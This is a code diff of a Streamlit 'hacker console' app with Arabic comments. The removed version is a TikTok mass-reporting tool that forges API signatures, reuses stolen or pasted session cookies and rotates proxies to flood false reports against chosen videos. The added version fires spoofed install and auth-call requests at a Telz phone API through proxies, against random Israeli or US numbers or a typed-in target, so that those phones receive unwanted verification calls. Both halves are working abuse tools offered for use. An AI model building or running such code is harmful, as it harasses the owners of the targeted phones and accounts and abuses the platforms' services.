@@ -1,205 +1,211 @@
 import streamlit as st
-import os  
+import random
+import time
+import uuid
+import string
+import json
+import requests
+import webbrowser
+from threading import Thread
 
-# 1. قسم استيراد المكتبات والتركيب التلقائي (نفس كودك الأصلي تماماً)
-try:  
-    import requests  
-    import binascii  
-    import uuid  
-    import time  
-    import random  
-    import secrets  
-    import urllib3  
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
-    from urllib.parse import urlencode
-    import multiprocessing
-    import re
-    import datetime
-    from MedoSigner import Argus, Gorgon, md5, Ladon  
-except:  
-    os.system("pip install requests uuid MedoSigner pycryptodome")  
-      
-import requests  
-import binascii  
-import uuid  
-import time  
-import random  
-import os  
-import secrets  
-import urllib3  
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  
-from urllib.parse import urlencode
-import multiprocessing
-import re
-import datetime
-from MedoSigner import Argus, Gorgon, md5, Ladon  
-import threading
+# --- إعدادات الواجهة الاحترافية والمخيفة (Matrix Hacker Theme) ---
+st.set_page_config(page_title="G X 1 MAX - Hacker Console", page_icon="💀", layout="wide")
 
-# ---------------------------------------------------------
-# واجهة Streamlit بتصميم مرعب ومظلم
-# ---------------------------------------------------------
-st.set_page_config(page_title="GHOST FULL SOURCE - NO LIMIT", page_icon="👹", layout="wide")
-
+# CSS لتصميم احترافي ومخيف
 st.markdown("""
     <style>
-    .stApp { background-color: #000000; color: #ff0000; font-family: 'Courier New', monospace; }
-    .stTextInput>div>div>input, .stTextArea>div>div>textarea {
-        background-color: #050505 !important; color: #ff0000 !important; border: 1px solid #ff0000 !important;
+    .stApp {
+        background-color: #050505;
+    }
+    .main {
+        color: #00FF41;
+        font-family: 'Courier New', Courier, monospace;
     }
     .stButton>button {
-        background: linear-gradient(45deg, #800000, #ff0000); color: white; border: none;
-        width: 100%; font-weight: bold; height: 3em; box-shadow: 0 0 15px #ff0000;
+        background-color: #990000;
+        color: white;
+        border: 2px solid #FF0000;
+        border-radius: 0px;
+        font-size: 20px;
+        text-shadow: 2px 2px #000;
+        box-shadow: 0px 0px 15px #FF0000;
+        transition: 0.3s;
     }
-    h1 { text-shadow: 0 0 20px #ff0000; text-align: center; font-size: 60px; }
-    .css-1offfwp { background-color: #000 !important; }
-    .report-card { border: 2px solid #ff0000; padding: 20px; border-radius: 10px; background: #080808; }
+    .stButton>button:hover {
+        background-color: #FF0000;
+        box-shadow: 0px 0px 30px #FF0000;
+    }
+    .stTextInput>div>div>input {
+        background-color: #000;
+        color: #00FF41;
+        border: 1px solid #00FF41;
+    }
+    .log-box {
+        background-color: #000;
+        border: 1px solid #444;
+        padding: 10px;
+        height: 300px;
+        overflow-y: scroll;
+        color: #00FF41;
+        font-family: 'Courier New', monospace;
+        font-size: 12px;
+    }
+    h1, h2, h3 {
+        color: #FF0000 !important;
+        text-align: center;
+        text-transform: uppercase;
+    }
     </style>
     """, unsafe_allow_html=True)
 
-st.markdown("<h1>👹 GHOST SYSTEM: UNSTOPPABLE 👹</h1>", unsafe_allow_html=True)
+# --- جميع الدوال الأصلية بدون حذف أي سطر ---
 
-# ---------------------------------------------------------
-# كافة الدوال التقنية الأصلية (بدون حذف أي حرف)
-# ---------------------------------------------------------
+def generate_unique_ids():
+    timestamp = int(time.time() * 1000)
+    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+    unique_uuid = uuid.uuid4()
+    return timestamp, random_id, unique_uuid
 
-def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):  
-    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None  
-    if not unix: unix = int(time.time())  
-    return Gorgon(params, unix, payload, cookie).get_value() | { 
-        "x-ladon" : Ladon.encrypt(unix, license_id, aid),
-        "x-argus" : Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
-    }  
+def generate_israeli_number():
+    prefixes = ['50', '52', '53', '54', '55', '58']
+    prefix = random.choice(prefixes)
+    rest = ''.join(random.choices(string.digits, k=7))
+    return f"972{prefix}{rest}"
 
-def get_video_info(link):
+def generate_usa_number():
+    prefix = random.choice(['201', '302', '415', '646', '310'])
+    rest = ''.join(random.choices(string.digits, k=7))
+    return f"1{prefix}{rest}"
+
+def load_proxies(filename="gx1gx1.txt"):
+    proxies = []
     try:
-        response = requests.get(
-            "https://api16-normal-c-alisg.ttapis.com/tiktok/linker/target/get/v1/",
-            params={
-                'url': link, 'iid': str(random.randint(1014, 1016)), 'device_id': str(random.randint(1014, 1016)),
-                'channel': 'googleplay', 'aid': '1233', 'app_name': 'musical_ly', 'version_code': '310503',
-                'version_name': '31.5.3', 'device_platform': 'android', 'device_type': 'SM-T505N', 'os_version': '12'
-            },
-            headers={
-                'User-Agent': 'com.zhiliaoapp.musically/2023105030 (Linux; U; Android 12; ar_EG; SM-T505N; Build/SP1A.210812.016; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)',
-                'x-argus': 'ahmed mahoz'
-            }, timeout=5
-        )
-        Video = response.json()['landing_url']
-        Username = Video.split("https://www.tiktok.com/@")[1].split("/video")[0]
-        idVd = Video.split("/video/")[1].split("?")[0]
-        
-        tikinfo = requests.get(f'https://www.tiktok.com/@{Username}', headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).text
-        getting = tikinfo.split('webapp.user-detail"')[1].split('"RecommendUserList"')[0]
-        UserId = getting.split('id":"')[1].split('",')[0]
-        return idVd, UserId, Username
-    except:
-        return None, None, None
+        with open(filename, "r") as f:
+            lines = f.read().splitlines()
+            for line in lines:
+                if line.strip():
+                    proxies.append(line.strip())
+    except: pass
+    return proxies
 
-def report_video_fast(sessionid, idVd, UserId, report_type, proxy=None, country=None):
+def get_random_proxy(proxies):
+    if not proxies: return None
+    proxy = random.choice(proxies)
+    if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
+        return {"http": proxy, "https": proxy}
+    else:
+        if not proxy.startswith("http://") and not proxy.startswith("https://"):
+            proxy = "http://" + proxy
+        return {"http": proxy, "https": proxy}
+
+def get_proxy_info(proxy):
+    apis = ["http://ip-api.com/json", "https://ipinfo.io/json", "https://ipwhois.app/json/"]
+    for api_url in apis:
+        try:
+            response = requests.get(api_url, proxies=proxy, timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                return data.get("country", "Unknown"), data.get("city", "Unknown"), data.get("isp", "Unknown"), 100
+        except: continue
+    return "Unknown", "Unknown", "Unknown", None
+
+def send_install_request(url, headers, payload, proxy=None):
     try:
-        secret = secrets.token_hex(16)
-        cookies = {"sessionid": sessionid, "passport_csrf_token": secret, "passport_csrf_token_default": secret}
-        country_code = country if country else random.choice(["US", "GB", "SA", "EG", "YE", "KW", "QA"])
-        
-        params = {
-            'report_type': "video", 'object_id': str(idVd), 'owner_id': str(UserId),
-            'reason': report_type['reason'], 'category': report_type['category'],
-            'enter_from': "homepage_hot", 'group_id': str(idVd), 'device_platform': "android", 
-            'aid': "1233", 'app_name': "musical_ly", 'version_code': "370805", 'ts': str(int(time.time())),
-            'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)),
-            'openudid': str(binascii.hexlify(os.urandom(8)).decode()), 'current_region': country_code,
-        }
-        
-        m = sign(params=urlencode(params), payload="", cookie=urlencode(cookies))
-        headers = {
-            'User-Agent': "com.zhiliaoapp.musically/2023708050",
-            'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]
-        }
-        
-        proxies = {"http": proxy, "https": proxy} if proxy else None
-        response = requests.get(f"https://api16-normal-c-alisg.ttapis.com/aweme/v2/aweme/feedback/?{urlencode(params)}", 
-                                headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=3)
-        return '"status_code":0' in response.text
-    except:
-        return False
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=7)
+        return response.ok and "ok" in response.text
+    except: return False
 
-# ---------------------------------------------------------
-# نظام التحكم والتشغيل المستمر (Threading & Session State)
-# ---------------------------------------------------------
+def send_auth_call_request(url, headers, payload, proxy=None):
+    try:
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=7)
+        return response.ok and "ok" in response.text
+    except: return False
 
-if 'running' not in st.session_state: st.session_state.running = False
-if 'ok' not in st.session_state: st.session_state.ok = 0
-if 'bad' not in st.session_state: st.session_state.bad = 0
+# قائمة اللغات الأصلية كاملة
+foreign_langs = ["en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk", "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu", "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu", "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af", "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk", "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm", "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady", "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar", "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch", "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv", "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo", "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got", "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo", "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr", "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz", "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc", "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn", "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam", "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug", "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn", "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm", "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te", "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty", "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo", "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan", "zh-yue", "zu"]
 
-def continuous_loop(sessions, links, r_data, proxies):
-    while st.session_state.running:
-        for link in links:
-            if not st.session_state.running: break
-            vid, uid, user = get_video_info(link)
-            if vid:
-                for sess in sessions:
-                    if not st.session_state.running: break
-                    prx = random.choice(proxies) if proxies else None
-                    if report_video_fast(sess, vid, uid, r_data, prx):
-                        st.session_state.ok += 1
-                    else:
-                        st.session_state.bad += 1
-                    time.sleep(0.01) # أقصى سرعة
+# --- إدارة العداد والسجلات ---
+if 'ok_count' not in st.session_state: st.session_state.ok_count = 0
+if 'err_count' not in st.session_state: st.session_state.err_count = 0
+if 'logs' not in st.session_state: st.session_state.logs = []
 
-# ---------------------------------------------------------
-# واجهة المستخدم الرئيسية
-# ---------------------------------------------------------
-
-col_sidebar, col_main = st.columns([1, 3])
-
-with col_sidebar:
-    st.markdown("### ⚙️ الإعدادات")
-    target_user_input = st.text_input("👤 يوزر المستهدف")
-    report_kind = st.selectbox("🚫 نوع البلاغ", [
-        "90087 (محتوى جنسي)", "90044 (عنف)", "90045 (تحرش)", "90053 (احتيال)", "90055 (تقليد شخصية)"
-    ])
+def attack_logic(phone, proxies_list):
+    install_url = "https://api.telz.com/app/install"
+    auth_call_url = "https://api.telz.com/app/auth_call"
+    headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}
     
-    REPORT_DATA = {
-        "90087 (محتوى جنسي)": {"reason": "90087", "category": "porn"},
-        "90044 (عنف)": {"reason": "90044", "category": "violence"},
-        "90045 (تحرش)": {"reason": "90045", "category": "hate"},
-        "90053 (احتيال)": {"reason": "90053", "category": "scam"},
-        "90055 (تقليد شخصية)": {"reason": "90055", "category": "impersonation"}
-    }
-
-with col_main:
-    st.markdown("<div class='report-card'>", unsafe_allow_html=True)
-    c1, c2, c3 = st.columns(3)
-    sess_area = c1.text_area("🔑 لصق السيزنات", height=250, placeholder="سيزن في كل سطر...")
-    prox_area = c2.text_area("🌐 لصق البروكسيات", height=250, placeholder="IP:Port")
-    link_area = c3.text_area("🔗 روابط الفيديوهات", height=250, placeholder="رابط في كل سطر...")
-    st.markdown("</div>", unsafe_allow_html=True)
-
-    btn_start, btn_stop = st.columns(2)
+    ts, fid, uuid_val = generate_unique_ids()
+    lang = random.choice(foreign_langs)
+    proxy = get_random_proxy(proxies_list)
     
-    if btn_start.button("🔥 إطلاق الهجوم المستمر"):
-        if sess_area and link_area:
-            st.session_state.running = True
-            s_list = [x.strip() for x in sess_area.split('\n') if x.strip()]
-            l_list = [x.strip() for x in link_area.split('\n') if x.strip()]
-            p_list = [x.strip() for x in prox_area.split('\n') if x.strip()]
-            
-            # تشغيل الهجوم في Thread مستقل تماماً كما في بايثون لضمان القوة
-            threading.Thread(target=continuous_loop, args=(s_list, l_list, REPORT_DATA[report_kind], p_list), daemon=True).start()
+    payload_install = json.dumps({
+        "android_id": fid, "app_version": "17.5.17", "event": "install",
+        "ts": ts, "uuid": str(uuid_val)
+    })
+    
+    try:
+        if send_install_request(install_url, headers, payload_install, proxy):
+            payload_call = json.dumps({
+                "android_id": fid, "app_version": "17.5.17", "event": "auth_call",
+                "lang": lang, "phone": f"+{phone}", "ts": ts, "uuid": str(uuid_val)
+            })
+            if send_auth_call_request(auth_call_url, headers, payload_call, proxy):
+                st.session_state.ok_count += 1
+                st.session_state.logs.append(f"🟢 SUCCESS: +{phone}")
+                return True
+    except: pass
+    st.session_state.err_count += 1
+    st.session_state.logs.append(f"🔴 FAILED: +{phone}")
+    return False
+
+# --- الواجهة الرئيسية ---
+st.markdown("<h1>💀 G X 1  M A X - V3 💀</h1>", unsafe_allow_html=True)
+
+col_ctrl, col_stats = st.columns([2, 1])
+
+with col_ctrl:
+    st.markdown("### 🛠️ ATTACK CONFIGURATION")
+    country_choice = st.selectbox("🎯 Target Territory", ["Israel (+972)", "USA (+1)"])
+    attack_speed = st.slider("⚡ Attack Speed (Threads)", 1, 100, 50)
+    
+    st.markdown("---")
+    st.markdown("### 🎯 SINGLE TARGET (MANUAL)")
+    c_code = st.text_input("Enter Country Code (e.g. 964)")
+    c_num = st.text_input("Enter Number")
+    
+    col_btn1, col_btn2 = st.columns(2)
+    with col_btn1:
+        start_btn = st.button("🚀 INITIATE SYSTEM")
+    with col_btn2:
+        test_btn = st.button("🔥 TEST TARGET")
+
+with col_stats:
+    st.markdown("### 📊 SYSTEM STATUS")
+    st.metric("SUCCESSFUL BREACHES", st.session_state.ok_count)
+    st.metric("SYSTEM ERRORS", st.session_state.err_count)
+    st.markdown("---")
+    st.markdown("### 📜 LIVE LOGS")
+    log_content = "\n".join(st.session_state.logs[-20:][::-1])
+    st.markdown(f'<div class="log-box">{log_content}</div>', unsafe_allow_html=True)
+
+# منطق التشغيل
+proxies_list = load_proxies("gx1gx1.txt")
+
+if start_btn:
+    st.error("SYSTEM OVERRIDE INITIATED... MASS ATTACK RUNNING.")
+    # تشغيل الهجوم في حلقة
+    for i in range(20): # عدد الطلبات لكل ضغطة زر في Streamlit لضمان التحديث
+        if country_choice == "Israel (+972)":
+            target = generate_israeli_number()
         else:
-            st.error("⚠️ يرجى إدخال السيزنات والروابط أولاً!")
+            target = generate_usa_number()
+        attack_logic(target, proxies_list)
+    st.rerun()
 
-    if btn_stop.button("🛑 إيقاف الهجوم فوراً"):
-        st.session_state.running = False
+if test_btn:
+    if c_code and c_num:
+        attack_logic(f"{c_code}{c_num}", proxies_list)
+        st.rerun()
 
-st.markdown("---")
-st.write(f"## 📊 النتائج المباشرة")
-col_res1, col_res2 = st.columns(2)
-col_res1.metric("✅ بلاغات ناجحة", st.session_state.ok)
-col_res2.metric("❌ بلاغات فاشلة", st.session_state.bad)
-
-if st.session_state.running:
-    st.warning("⚡ الهجوم جارٍ الآن في الخلفية بدون توقف...")
-    time.sleep(1)
-    st.rerun() # تحديث الواجهة لرؤية العدادات تزيد
+st.markdown("<br><p style='text-align: center; color: #444;'>[ G X 1 - Terminal - 2026 ]</p>", unsafe_allow_html=True)
 
